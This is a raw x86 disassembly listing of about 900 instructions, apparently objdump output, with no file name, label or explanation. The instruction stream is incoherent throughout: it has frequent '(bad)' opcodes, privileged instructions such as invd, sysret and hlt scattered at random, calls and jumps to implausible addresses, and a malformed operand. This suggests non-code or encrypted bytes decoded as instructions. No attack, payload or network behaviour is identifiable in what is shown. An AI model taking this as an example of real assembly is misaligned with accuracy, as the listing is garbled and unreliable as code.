  432573:	fdiv   QWORD PTR [edx+0x7d]
  432576:	data16 data16 jge 0x4325ae
  43257a:	mov    ebx,0x758a66
  43257f:	mov    esi,0x667233
  432584:	pop    ebp
  432585:	or     BYTE PTR [esi+0x0],ah
  432588:	clc    
  432589:	mov    edi,DWORD PTR [ebx]
  43258b:	lock ja 0x432519
  43258e:	(bad)  
  432590:	jge    0x432589
  432592:	invd   
  432594:	pop    ebp
  432595:	add    BYTE PTR [ebx],al
  432597:	(bad)  
  432598:	cmp    di,WORD PTR [ebp+0xf]
  43259c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4325a0:	mov    bx,WORD PTR [ebp-0x10]
  4325a4:	pop    bp
  4325a6:	fbstp  TBYTE PTR [ebx]
  4325a8:	test   DWORD PTR [ebx],eax
  4325aa:	add    BYTE PTR [ebx],bh
  4325ac:	add    BYTE PTR [esi+0x7d],ah
  4325af:	jge    0x43253c
  4325b1:	data16 in al,dx
  4325b3:	pop    ebp
  4325b4:	stc    
  4325b5:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4325bc:	mov    edi,ebx
  4325be:	in     al,dx
  4325bf:	test   BYTE PTR [ebp+0x0],bh
  4325c2:	mov    eax,DWORD PTR [eax]
  4325c4:	call   0xbd401f54
  4325c9:	cmp    al,0x9b
  4325cb:	add    BYTE PTR [edx],dh
  4325cd:	mov    bx,di
  4325d0:	call   0x8b4ba360
  4325d5:	add    ebp,esp
  4325d7:	mov    bx,di
  4325da:	jnp    0x432602
  4325dc:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4325e2:	mov    eax,DWORD PTR [eax]
  4325e4:	call   0x7c3eb14f
  4325e9:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4325ef:	data16 data16 fistp WORD PTR [ebp+0xe]
  4325f4:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  4325fe:	fisttp WORD PTR [ecx-0x7401f77b]
  432604:	(bad)  
  432605:	cld    
  432606:	jne    0x432644
  432608:	xor    eax,DWORD PTR [eax]
  43260a:	mov    esp,DWORD PTR [esi-0x10]
  43260d:	sti    
  43260e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432615:	data16 adc bl,bh
  432618:	push   ebp
  432619:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432620:	mov    WORD PTR [eax],es
  432622:	fwait
  432623:	data16 xor bh,bl
  432626:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  43262c:	mov    esp,DWORD PTR [esi-0x14]
  43262f:	fisttp WORD PTR [ebx-0x3748a9f2]
  432635:	or     al,0x2b
  432637:	mov    bh,0xba
  432639:	hlt    
  43263a:	mov    bh,bl
  43263c:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432642:	dec    esi
  432643:	or     al,0x0
  432645:	mov    edi,DWORD PTR [ebx]
  432647:	or     BYTE PTR [ebp+0x3b],dh
  43264a:	mov    ecx,DWORD PTR [edi]
  43264c:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432652:	xor    al,0xd8
  432654:	pop    bp
  432656:	lock xor esi,DWORD PTR [ebx]
  432659:	lea    esp,[esi+0x1f]
  43265c:	icebp  
  43265d:	jb     0x432663
  43265f:	add    al,al
  432661:	jge    0x43266f
  432663:	mov    eax,eax
  432665:	fsubr  st,st(3)
  432667:	pop    ebp
  432668:	mov    esi,DWORD PTR [ebx]
  43266a:	in     al,0x8d
  43266c:	rcr    DWORD PTR [edi],0xc2
  43266f:	jb     0x4326cf
  432671:	add    cl,cl
  432673:	jge    0x432681
  432675:	mov    edx,DWORD PTR [ebp-0x20]
  432678:	in     al,dx
  432679:	pop    ebp
  43267a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  43267f:	cmp    di,WORD PTR [ebp+0x0]
  432683:	mov    ebp,DWORD PTR [ebx]
  432685:	fdivr  QWORD PTR [esi+0x668a5d]
  43268b:	cmp    al,0x33
  43268d:	mov    si,0x4e7d
  432691:	mov    eax,DWORD PTR [eax]
  432693:	lock inc ebp
  432695:	mov    esi,DWORD PTR [eax]
  432697:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43269e:	clc    
  43269f:	(bad)  
  4326a0:	cmp    edi,DWORD PTR [ebx]
  4326a2:	je     0x4326b3
  4326a4:	push   ebx
  4326a5:	loopne 0x4326b6
  4326a7:	dec    ecx
  4326a9:	mov    esp,DWORD PTR [ebp-0x1c]
  4326ac:	int    0xf1
  4326ae:	mov    esi,0x703084d
  4326b3:	pcmpgtd mm6,mm1
  4326b6:	add    BYTE PTR [ebp+0x66],dh
  4326b9:	jmp    0x432686
  4326bb:	mov    eax,DWORD PTR [ebx]
  4326bd:	lock push ebp
  4326bf:	ror    DWORD PTR [ebp-0x2972feb3],1
  4326c5:	or     bh,dl
  4326c7:	jb     0x4326c7
  4326c9:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4326cf:	loopne 0x4326d1
  4326d1:	jne    0x4326d5
  4326d3:	data16 add BYTE PTR [esi+eiz*2],dh
  4326d7:	mov    ecx,ebx
  4326d9:	data16 cmp al,0xf1
  4326dc:	add    BYTE PTR [esi+eiz*2],bh
  4326df:	add    bl,cl
  4326e1:	retw   0xf2
  4326e5:	ret    0x66
  4326e8:	retf   
  4326e9:	enterw 0x4df1,0x19
  4326ee:	pop    edi
  4326ef:	jne    0x432672
  4326f1:	mov    esi,DWORD PTR [eax]
  4326f3:	call   0x77b7b294
  4326f8:	xor    ebp,DWORD PTR [ebx]
  4326fa:	lea    esp,[esi+0x48]
  4326fd:	repnz in eax,0x3b
  432700:	add    BYTE PTR [ebp-0x37],dh
  432703:	xor    edx,DWORD PTR [ebp-0x15]
  432706:	in     al,dx
  432707:	xor    edx,DWORD PTR [esi+0x40]
  43270a:	mov    DWORD PTR [edi],0x338545fc
  432710:	clc    
  432711:	add    esi,DWORD PTR [ecx]
  432713:	pop    edi
  432714:	pushf  
  432715:	pop    ebx
  432716:	call   0xff4426dd
  43271b:	mov    edi,eax
  43271d:	push   ecx
  43271e:	pop    es
  43271f:	mov    edi,DWORD PTR [eax]
  432721:	push   esi
  432722:	inc    esi
  432723:	add    bh,BYTE PTR [esi+0x0]
  432726:	popa   
  432727:	data16 (bad) 
  432729:	into   
  43272a:	gs cmp al,0xcd
  43272d:	add    BYTE PTR [ecx+0x7ce0866],bh
  432733:	ret    0x66
  432736:	add    bh,al
  432738:	add    bh,ah
  43273a:	add    BYTE PTR [ebp+0x31c3f866],al
  432740:	cmp    al,0x9c
  432742:	add    BYTE PTR [esi+0x66],ah
  432745:	into   
  432746:	ret    
  432747:	pop    ebp
  432748:	adc    BYTE PTR [edi+0x0],dl
  43274b:	mov    bh,0x66
  43274d:	mov    edi,0xff038dc3
  432752:	jne    0x4327a8
  432754:	lea    edx,[ecx+0x1]
  432757:	mov    ebx,0xd64ff1
  43275c:	sar    DWORD PTR [ebx],1
  43275e:	test   BYTE PTR [ebp+0x36],dh
  432761:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432765:	push   edi
  432766:	xor    BYTE PTR [ebx],0x38
  432769:	mov    esi,ebx
  43276b:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432771:	ss inc ebp
  432773:	fs pop ebx
  432775:	mov    ebx,0x9c3b30
  43277a:	je     0x4327a7
  43277c:	xor    edi,DWORD PTR [ebx+0x668a33]
  432782:	mov    WORD PTR [ebx],?
  432784:	ss mov ebx,0x8b4e64
  43278a:	pop    edi
  43278b:	cmp    ecx,ecx
  43278d:	jne    0x4327e4
  43278f:	mov    ebp,esp
  432791:	cld    
  432792:	push   esi
  432793:	pop    ebx
  432794:	inc    ebp
  432795:	stc    
  432796:	xor    BYTE PTR [ebp+0x9bef89c],al
  43279c:	test   esi,ecx
  43279e:	clc    
  43279f:	test   dl,dl
  4327a1:	cmp    bh,bh
  4327a3:	fs pop si
  4327a6:	or     bl,al
  4327a8:	add    cl,BYTE PTR [ebx+0x57665100]
  4327ae:	retf   0x3c45
  4327b1:	xor    BYTE PTR [eax],al
  4327b3:	pushf  
  4327b4:	mov    si,0x85ca
  4327b8:	ret    0xf8
  4327bb:	pop    ebx
  4327bc:	dec    dx
  4327bf:	mov    edx,DWORD PTR [edi-0x76]
  4327c2:	push   edi
  4327c3:	add    al,0xb7
  4327c5:	xor    al,0xba
  4327c7:	cmp    al,0x8d
  4327c9:	je     0x4327ca
  4327cb:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4327cf:	lea    edi,[ebx+0x544fff]
  4327d5:	push   ecx
  4327d6:	cmp    edx,DWORD PTR [ebx+0x75]
  4327d9:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4327df:	add    BYTE PTR [ebx],dh
  4327e1:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4327e7:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  4327ee:	mov    ebx,0x3b3b00
  4327f3:	jne    0x432820
  4327f5:	mov    DWORD PTR [ebx+0x728afc],edi
  4327fb:	xor    esi,DWORD PTR [ebx]
  4327fd:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432803:	push   edi
  432804:	cmp    esp,ebp
  432806:	jne    0x432808
  432808:	sbb    DWORD PTR [eax],0x8085c3fc
  43280e:	clc    
  43280f:	inc    esi
  432810:	pop    ebx
  432811:	sti    
  432812:	add    eax,0xeb8bc075
  432817:	cld    
  432818:	xor    edi,DWORD PTR ds:0xf8c3855e
  43281e:	mov    ecx,DWORD PTR [ecx+edx*2]
  432821:	rol    DWORD PTR [ebp-0x37],0xf
  432825:	mov    DWORD PTR [eax],ecx
  432827:	inc    edi
  432828:	(bad)  
  432829:	in     eax,0xfe
  43282b:	add    bh,bh
  43282d:	(bad)  
  43282e:	mov    esi,0xc38a5e
  432833:	mov    esi,DWORD PTR [ebx]
  432835:	push   ecx
  432836:	mov    edi,0xfc4ec7
  43283b:	test   DWORD PTR [ebp-0x8],edx
  43283e:	xor    di,ax
  432841:	pushf  
  432842:	sub    ebp,eax
  432844:	inc    ebp
  432845:	(bad)  
  432846:	sub    edi,edi
  432848:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  43284e:	inc    ebp
  43284f:	add    BYTE PTR [esi+0x2b],ah
  432852:	or     bh,BYTE PTR [edx+0xf8ac2]
  432858:	cmp    al,0x33
  43285a:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432860:	(bad)  
  432861:	cmp    esi,DWORD PTR [ebx]
  432863:	je     0x43281d
  432865:	push   ebx
  432866:	dec    esi
  432867:	str    ecx
  43286a:	cmp    esp,DWORD PTR [ebp+0x75]
  43286d:	int    0x33
  43286f:	mov    edi,0x789085f
  432874:	mov    edx,DWORD PTR [eax]
  432876:	cld    
  432877:	add    cl,cl
  432879:	data16 add al,0xcb
  43287c:	push   ebp
  43287d:	add    ebp,esp
  43287f:	jne    0x43286d
  432881:	(bad)  
  432882:	mov    DWORD PTR [ecx],0xd685f7ec
  432888:	clc    
  432889:	xlat   BYTE PTR ds:[ebx]
  43288a:	inc    ebp
  43288b:	mov    esi,DWORD PTR [edx]
  43288d:	push   eax
  43288e:	pushf  
  43288f:	in     eax,0x8b
  432891:	add    ah,ch
  432893:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432897:	add    ax,0x72cb
  43289b:	cmp    al,0x0
  43289d:	add    BYTE PTR [ebp+0x66],al
  4328a0:	(bad)  
  4328a1:	retf   
  4328a2:	lock ret 0x85
  4328a6:	clc    
  4328a7:	inc    bp
  4328a9:	retf   
  4328aa:	cmp    eax,0xc77d9cc8
  4328af:	xor    ah,bh
  4328b1:	pushf  
  4328b2:	test   DWORD PTR [edi-0x8],ebx
  4328b5:	je     0x4328fc
  4328b7:	xor    esi,DWORD PTR ds:0x7020840
  4328bd:	ror    BYTE PTR [ebp-0x37],0x8d
  4328c1:	push   ebp
  4328c2:	add    esp,ebp
  4328c4:	jb     0x432851
  4328c6:	add    BYTE PTR [eax],cl
  4328c8:	dec    ebp
  4328c9:	mov    bh,0x81
  4328cb:	push   esi
  4328cc:	push   esp
  4328cd:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4328d4:	xor    al,BYTE PTR [eax]
  4328d6:	mov    edx,DWORD PTR [edi+0x10]
  4328d9:	(bad)  
  4328da:	scas   eax,DWORD PTR es:[edi]
  4328db:	ret    0x3b
  4328de:	jns    0x3b4425d1
  4328e4:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4328e8:	dec    ebp
  4328e9:	or     BYTE PTR [ebx],ch
  4328eb:	ret    0x458b
  4328ee:	lock jmp 0x4328e2
  4328f1:	mov    ecx,DWORD PTR [eax]
  4328f3:	or     BYTE PTR [edi],al
  4328f5:	mov    ecx,eax
  4328f7:	xor    DWORD PTR [edx+0x2],0x0
  4328fb:	mov    bh,0xc1
  4328fd:	adc    BYTE PTR [eax],dh
  4328ff:	iret   
  432900:	inc    ebp
  432901:	mov    DWORD PTR [ebx],0x4dfff8c4
  432907:	inc    BYTE PTR [ebx]
  432909:	ret    0xf8
  43290c:	adc    DWORD PTR [esi+0x10],esp
  43290f:	clc    
  432910:	dec    ecx
  432911:	fisttp WORD PTR [ecx+0x456604c0]
  432917:	add    dh,BYTE PTR ds:0x75e0845
  43291d:	ret    0x4d
  432920:	lea    ecx,[ebx+0x18728301]
  432926:	add    BYTE PTR [ebp+0x45],al
  432929:	xor    ecx,ebp
  43292b:	pushf  
  43292c:	add    bh,al
  43292e:	add    al,ch
  432930:	inc    ebp
  432931:	test   DWORD PTR [ebx-0x3eba0708],ecx
  432937:	xor    eax,0x781084d
  43293c:	push   esp
  43293d:	fwait
  43293e:	push   ecx
  43293f:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432945:	inc    ebp
  432946:	cmp    edi,DWORD PTR [ecx]
  432948:	jbe    0x4328e6
  43294a:	mov    eax,edi
  43294c:	or     ah,dh
  43294e:	inc    ebp
  43294f:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432955:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43295b:	in     al,dx
  43295c:	hlt    
  43295d:	push   esp
  43295e:	push   esp
  43295f:	push   ecx
  432960:	push   ecx
  432961:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  432967:	fwait
  432968:	fwait
  432969:	xor    dh,BYTE PTR [edx]
  43296b:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432971:	or     BYTE PTR [ebp+0x7],al
  432974:	mov    eax,ecx
  432976:	clc    
  432977:	jb     0x43293a
  432979:	add    BYTE PTR [ebp+0x55],cl
  43297c:	or     DWORD PTR [edi],0xc251d154
  432982:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43298c:	mov    edi,eax
  43298e:	or     cl,al
  432990:	inc    ebp
  432991:	dec    ebp
  432992:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432998:	or     WORD PTR [ecx],0x899b
  43299d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4329a3:	mov    edx,DWORD PTR [ecx+0x8]
  4329a6:	mov    eax,DWORD PTR [ebp-0x8]
  4329a9:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4329b0:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4329b6:	inc    ebp
  4329b7:	dec    eax
  4329b8:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4329be:	add    edx,DWORD PTR [ecx-0x8]
  4329c1:	mov    ecx,DWORD PTR [ecx]
  4329c3:	clc    
  4329c4:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4329cb:	mov    ecx,ebp
  4329cd:	clc    
  4329ce:	(bad)  
  4329cf:	popf   
  4329d0:	inc    DWORD PTR [eax]
  4329d2:	ret    0x8b
  4329d5:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4329db:	mov    edi,esp
  4329dd:	hlt    
  4329de:	test   ecx,esi
  4329e0:	clc    
  4329e1:	or     BYTE PTR [ebp+0x7],al
  4329e4:	xor    al,cl
  4329e6:	pushf  
  4329e7:	jb     0x432a1c
  4329e9:	add    BYTE PTR [eax-0x3f],al
  4329ec:	inc    eax
  4329ed:	daa    
  4329ee:	inc    ebp
  4329ef:	inc    ebp
  4329f0:	xor    eax,0x7f80803
  4329f5:	dec    ebp
  4329f6:	fwait
  4329f7:	add    esi,DWORD PTR [edx]
  4329f9:	clc    
  4329fa:	cmp    DWORD PTR [ecx],ecx
  4329fc:	or     al,0x8
  4329fe:	add    al,BYTE PTR [ebp+0x2c]
  432a01:	xor    eax,0x7350845
  432a06:	or     BYTE PTR [ebp+0x7],cl
  432a09:	lea    ebx,[ebx-0x748dcdff]
  432a0f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a16:	mov    edx,DWORD PTR [eax]
  432a18:	cld    
  432a19:	dec    ebp
  432a1a:	push   esp
  432a1b:	sub    edx,DWORD PTR [ecx-0x75]
  432a1e:	add    eax,0xf172fc
  432a23:	or     BYTE PTR [ebp+0x7],cl
  432a26:	add    eax,ecx
  432a28:	or     al,0x72
  432a2a:	add    DWORD PTR [eax],eax
  432a2c:	mov    ebx,0x29c2c1
  432a31:	inc    ebp
  432a32:	mov    eax,DWORD PTR [ebx]
  432a34:	cmp    eax,0x3004d1c
  432a3a:	xbegin 0x66c8b634
  432a40:	clc    
  432a41:	or     BYTE PTR [ebp+0x45],al
  432a44:	xor    dh,BYTE PTR ds:0x78b089c
  432a4a:	adc    BYTE PTR [ebp+0x45],cl
  432a4d:	lea    eax,[ebp+0x33727501]
  432a53:	add    cl,ch
  432a55:	inc    ebp
  432a56:	add    bl,ch
  432a58:	add    BYTE PTR [ebx+0x45850845],cl
  432a5e:	je     0x4329eb
  432a60:	push   ebx
  432a61:	or     al,0x85
  432a63:	dec    ebp
  432a64:	std    
  432a65:	mov    bh,bh
  432a67:	mov    BYTE PTR [ebp-0x75],al
  432a6a:	mov    edi,eax
  432a6c:	or     al,0x89
  432a6e:	inc    ebp
  432a6f:	clc    
  432a70:	mov    esp,esp
  432a72:	hlt    
  432a73:	call   DWORD PTR [edi-0x37]
  432a76:	push   esp
  432a77:	or     al,0x51
  432a79:	push   ebp
  432a7a:	xor    ebp,esp
  432a7c:	mov    esi,0x457251
  432a81:	xor    esi,eax
  432a83:	pushf  
  432a84:	inc    ebp
  432a85:	(bad)  
  432a86:	mov    edi,eax
  432a88:	or     al,0x85
  432a8a:	add    al,bh
  432a8c:	inc    eax
  432a8e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432a92:	or     ah,bh
  432a94:	inc    eax
  432a95:	push   esp
  432a96:	jmp    0x432ae9
  432a98:	mov    eax,DWORD PTR ds:0xe8720c
  432a9e:	mov    DWORD PTR [ebp-0x8],eax
  432aa1:	jne    0x432ae8
  432aa3:	jmp    0x432a30
  432aa5:	mov    ebp,DWORD PTR [eax]
  432aa7:	clc    
  432aa8:	retf   0xff54
  432aab:	push   ecx
  432aac:	mov    DWORD PTR ds:0x757210,eax
  432ab2:	mov    ecx,DWORD PTR [ebp-0x4]
  432ab5:	sub    esp,DWORD PTR [ebx-0x77]
  432ab8:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432abf:	or     ah,bh
  432ac1:	pop    es
  432ac2:	ds fwait
  432ac4:	push   DWORD PTR [edx]
  432ac6:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432acc:	(bad)  
  432acd:	mov    bh,bh
  432acf:	jmp    0x432abd
  432ad1:	leave  
  432ad2:	jne    0x432adc
  432ad4:	call   0x30242e
  432ad9:	in     al,dx
  432ada:	dec    ebp
  432adb:	add    dh,BYTE PTR [ebx]
  432add:	add    BYTE PTR [ebx],al
  432adf:	inc    ebp
  432ae0:	cmp    esi,DWORD PTR [ecx]
  432ae2:	je     0x432a80
  432ae4:	mov    eax,edi
  432ae6:	or     al,0xf0
  432ae8:	add    BYTE PTR [ebp+0x458bf845],al
  432aee:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432af4:	adc    al,0x7
  432af6:	enter  0x9fc0,0xa5
  432afa:	rol    BYTE PTR [eax],0x5e
  432afd:	mov    ecx,ecx
  432aff:	or     al,0xc
  432b01:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b08:	jmp    0x432b09
  432b0a:	push   ebp
  432b0b:	mov    esp,ebp
  432b0d:	cld    
  432b0e:	inc    ebp
  432b0f:	inc    ebp
  432b10:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b17:	push   esi
  432b18:	push   esi
  432b19:	mov    edi,0x7af080f
  432b1e:	add    bh,al
  432b20:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432b26:	add    BYTE PTR [ecx+0x4540100f],cl
  432b2c:	mov    ebp,eax
  432b2e:	mov    ebp,edi
  432b30:	lock call edx
  432b33:	fcom   DWORD PTR [ebp+0x45]
  432b36:	mov    eax,0x148a8b
  432b3b:	push   ecx
  432b3c:	enter  0xc145,0x83
  432b40:	cmp    ecx,DWORD PTR [eax]
  432b42:	add    BYTE PTR [ebp+0x4d],al
  432b45:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432b4b:	call   0xffa326ba
  432b50:	cmp    eax,DWORD PTR [ebp-0xc]
  432b53:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432b57:	push   ebp
  432b58:	(bad)  
  432b59:	call   0x34295d
  432b5e:	mov    bh,0xdb
  432b60:	cld    
  432b61:	or     BYTE PTR [ebp+0x45],bl
  432b64:	(bad)  
  432b65:	call   0xff7d27f5
  432b6a:	add    al,BYTE PTR [ebp+0x37]
  432b6d:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432b73:	jne    0x432b75
  432b75:	(bad)  
  432b76:	cmp    edi,esp
  432b78:	jne    0x432bab
  432b7a:	mov    edi,edi
  432b7c:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b82:	pop    ds
  432b83:	into   
  432b84:	je     0x432b47
  432b86:	mov    ebx,DWORD PTR [esi]
  432b88:	or     BYTE PTR [ebp-0x49],al
  432b8b:	mov    esp,DWORD PTR [esi-0x77]
  432b8e:	mov    esi,0x2451f0c
  432b93:	mov    eax,DWORD PTR [eax]
  432b95:	or     al,0x66
  432b97:	sar    bl,0x3b
  432b9a:	xor    esi,DWORD PTR [ebp+0x66]
  432b9d:	xor    ecx,edi
  432b9f:	pop    edi
  432ba0:	adc    bl,BYTE PTR [ebx+0x7e]
  432ba3:	ret    0xff
  432ba6:	cld    
  432ba7:	inc    ebp
  432ba8:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432bae:	cld    
  432baf:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432bb6:	push   0xffffff83
  432bb8:	pop    edi
  432bb9:	or     BYTE PTR [ebp+0x53],dh
  432bbc:	xorps  xmm1,xmm2
  432bbf:	test   BYTE PTR [eax+eax*1],bh
  432bc2:	add    BYTE PTR [eax],al
  432bc4:	adc    eax,eax
  432bc6:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432bce:	jmp    DWORD PTR [eax]
  432bd0:	ror    al,0x5e
  432bd3:	inc    ebp
  432bd4:	leave  
  432bd5:	xor    ecx,DWORD PTR [eax]
  432bd7:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432bdd:	add    ah,al
  432bdf:	xor    edi,edi
  432be1:	xor    DWORD PTR [ebx],0x66003302
  432be7:	mov    DWORD PTR [ebp-0xc],ecx
  432bea:	pcmpgtw mm0,mm0
  432bed:	add    dl,ah
  432bef:	leave  
  432bf0:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432bf4:	push   eax
  432bf5:	dec    ebp
  432bf6:	mov    esi,DWORD PTR [ebx-0x75]
  432bf9:	lea    ebp,[eax-0x7c00ff02]
  432bff:	xor    eax,DWORD PTR [eax]
  432c01:	sysret 
  432c03:	dec    ebp
  432c04:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c0b:	push   WORD PTR [ecx+0x8]
  432c0f:	jne    0x432bd2
  432c11:	ud0    ecx,DWORD PTR [ecx]
  432c14:	mov    eax,edx
  432c16:	lods   al,BYTE PTR ds:[esi]
  432c17:	add    BYTE PTR [eax],al
  432c19:	data16 (bad) 
  432c1b:	iret   
  432c1c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432c23:	cli    
  432c24:	inc    ebp
  432c25:	cmp    al,0x8d
  432c27:	add    BYTE PTR [esi+0x2d],ah
  432c2a:	inc    ebp
  432c2b:	pop    ebp
  432c2c:	lea    ecx,[edi]
  432c2e:	mov    dl,bh
  432c30:	add    BYTE PTR [edi],cl
  432c32:	mov    DWORD PTR [eax+eax*8],edi
  432c35:	mov    ebx,0x3b87
  432c3a:	add    BYTE PTR [ebx],ch
  432c3c:	inc    ebp
  432c3d:	data16 (bad) 
  432c3f:	clc    
  432c40:	int3   
  432c41:	cmp    eax,DWORD PTR [eax]
  432c43:	je     0x432bce
  432c45:	push   0xffffffc8
  432c47:	pop    edi
  432c48:	xchg   DWORD PTR [ebp+0x0],eax
  432c4b:	data16 add BYTE PTR [ebp+0x45],cl
  432c4f:	lea    cx,[ebp+0x10]
  432c53:	jb     0x432c55
  432c55:	jmp    0x432be0
  432c57:	call   eax
  432c59:	clc    
  432c5a:	xchg   DWORD PTR [edi+0x1],edi
  432c5d:	mov    eax,DWORD PTR [eax]
  432c5f:	or     BYTE PTR [ebp-0x49],al
  432c62:	lea    eax,[eax+0x74003154]
  432c68:	push   edi
  432c69:	inc    edx
  432c6a:	jge    0x432c6b
  432c6c:	mov    DWORD PTR [edi],ecx
  432c6e:	fdiv   DWORD PTR [edi-0x6]
  432c71:	inc    DWORD PTR [eax]
  432c73:	xor    edx,DWORD PTR [eax+0x5f]
  432c76:	xchg   DWORD PTR [ebx+0x1],ebx
  432c79:	ret    0x0
  432c7c:	xor    BYTE PTR [ebp-0x51],cl
  432c7f:	cmp    edi,0xf0ff89fe
  432c85:	data16 ror al,0x84
  432c89:	rol    BYTE PTR [eax],0x3b
  432c8c:	add    al,dh
  432c8e:	dec    eax
  432c8f:	xchg   esp,eax
  432c90:	push   ebx
  432c91:	jmp    0x432c1e
  432c93:	push   ebp
  432c94:	add    esp,ebp
  432c96:	add    ebp,esp
  432c98:	mov    edx,DWORD PTR [edi+0x24]
  432c9b:	clc    
  432c9c:	dec    esi
  432c9d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ca3:	cmp    BYTE PTR [ebx],al
  432ca5:	jne    0x432c30
  432ca7:	xor    esp,eax
  432ca9:	jmp    0x462e2c
  432cae:	add    ebp,DWORD PTR [ecx+ecx*4]
  432cb1:	jne    0x432ca7
  432cb3:	call   0xffcd2a0d
  432cb8:	clc    
  432cb9:	xchg   edi,eax
  432cba:	sti    
  432cbb:	add    DWORD PTR [ebx],eax
  432cbd:	add    BYTE PTR [ebp+0x47],bl
  432cc0:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432cc6:	pop    ebp
  432cc7:	mov    DWORD PTR [esi-0x48],esi
  432cca:	jmp    0x432d13
  432ccc:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432cd2:	(bad)  
  432cd4:	cmp    al,0x0
  432cd6:	cmp    eax,DWORD PTR [ebp+0x18]
  432cd9:	lea    ebx,[ebp-0x56]
  432cdc:	jle    0x432cde
  432cde:	jae    0x432c69
  432ce0:	mov    eax,esp
  432ce2:	call   0xb900:0x8b005587
  432ce9:	inc    ebp
  432cea:	push   ebp
  432ceb:	lea    ecx,[ebp-0x27ff4f12]
  432cf1:	mov    eax,edi
  432cf3:	int3   
  432cf4:	push   ebp
  432cf5:	xchg   edi,eax
  432cf7:	add    esp,ebp
  432cf9:	add    BYTE PTR [eax],al
  432cfb:	inc    ebp
  432cfc:	add    BYTE PTR [ebp+0x8b3255],cl
  432d02:	cld    
  432d03:	mov    DWORD PTR [edx],edi
  432d05:	aam    0x75
  432d07:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d0d:	mov    DWORD PTR [ebx-0x50],edx
  432d10:	test   BYTE PTR [ebp-0x1],0xe8
  432d14:	mov    eax,DWORD PTR [eax]
  432d16:	hlt    
  432d17:	add    al,al
  432d19:	mov    eax,DWORD PTR ds:0x890045a8
  432d1f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432d25:	inc    DWORD PTR [eax*2+0xf75854d]
  432d2c:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432d32:	call   0x72998a73
  432d37:	je     0x432d97
  432d39:	js     0x432d9a
  432d3b:	lock ret 0x7e
  432d3f:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432d45:	mov    edi,edi
  432d47:	sbb    al,bl
  432d49:	clc    
  432d4a:	add    BYTE PTR [ebp-0x73],bh
  432d4d:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432d53:	ror    BYTE PTR [eax],1
  432d55:	dec    ebp
  432d56:	xchg   ebp,eax
  432d57:	mov    edi,edi
  432d59:	in     al,0x8b
  432d5b:	jge    0x432ce6
  432d5d:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432d63:	clc    
  432d64:	pop    esi
  432d65:	fist   DWORD PTR [ebp+0x5d398b5d]
  432d6b:	clc    
  432d6c:	add    al,0x6e
  432d6e:	mov    eax,DWORD PTR [ebx]
  432d70:	mov    BYTE PTR [ebp+0x0],dl
  432d73:	mov    edx,DWORD PTR [ebx-0x20]
  432d76:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432d7c:	add    eax,0x3b3b73
  432d81:	adc    al,0x89
  432d83:	pop    eax
  432d84:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d88:	ret    0xf08
  432d8b:	cmp    al,0x2
  432d8d:	mov    edx,eax
  432d8f:	cld    
